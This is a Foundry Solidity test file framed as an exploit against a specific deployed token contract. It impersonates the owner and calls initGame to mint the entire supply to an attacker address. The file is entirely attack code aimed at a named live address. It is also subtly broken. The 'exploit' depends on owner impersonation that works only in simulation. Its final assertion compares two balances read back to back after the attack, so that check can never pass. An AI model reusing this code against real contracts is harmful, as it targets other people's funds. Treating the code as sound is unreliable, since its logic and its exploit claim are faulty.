// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
}

interface Ownable {
    function owner() external view returns (address);
}

interface HubGameToken {
    function initGame(
        string memory _gameCode,
        uint256 _supplyToken,
        uint256 _listingDate,
        address[] memory _wallets,
        uint256[] memory _percents,
        address[] memory _signers,
        uint256[] memory _tgePercents,
        uint256[] memory _numOfPeriods,
        uint256[] memory _ciffs
    ) external returns (address gameAddress);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = IBEP20(TARGET).balanceOf(attacker);

        // Get the owner address
        address owner = Ownable(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Prepare parameters for initGame
        string memory gameCode = "EXPLOIT";
        uint256 supplyToken = 1000000; // 1 million tokens
        uint256 listingDate = block.timestamp + 1 days;

        // Create arrays - attacker gets 100% of the supply
        address[] memory wallets = new address[](1);
        wallets[0] = attacker;

        uint256[] memory percents = new uint256[](1);
        percents[0] = 100; // 100% to attacker

        address[] memory signers = new address[](1);
        signers[0] = owner; // Owner as signer

        uint256[] memory tgePercents = new uint256[](1);
        tgePercents[0] = 100; // 100% TGE (immediately available)

        uint256[] memory numOfPeriods = new uint256[](1);
        numOfPeriods[0] = 1;

        uint256[] memory ciffs = new uint256[](1);
        ciffs[0] = 0;

        // Call initGame to mint tokens to attacker
        HubGameToken(TARGET).initGame(
            gameCode,
            supplyToken,
            listingDate,
            wallets,
            percents,
            signers,
            tgePercents,
            numOfPeriods,
            ciffs
        );

        vm.stopPrank();

        // Verify balance increased
        uint256 finalBalance = IBEP20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Verify ERC20 balance increased
        uint256 finalERC20Balance = IERC20(0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5).balanceOf(address(this));
        uint256 initialERC20Balance = IERC20(0x46bCBBB0D888dF90Eda86c9CA159C7727a8731D5).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

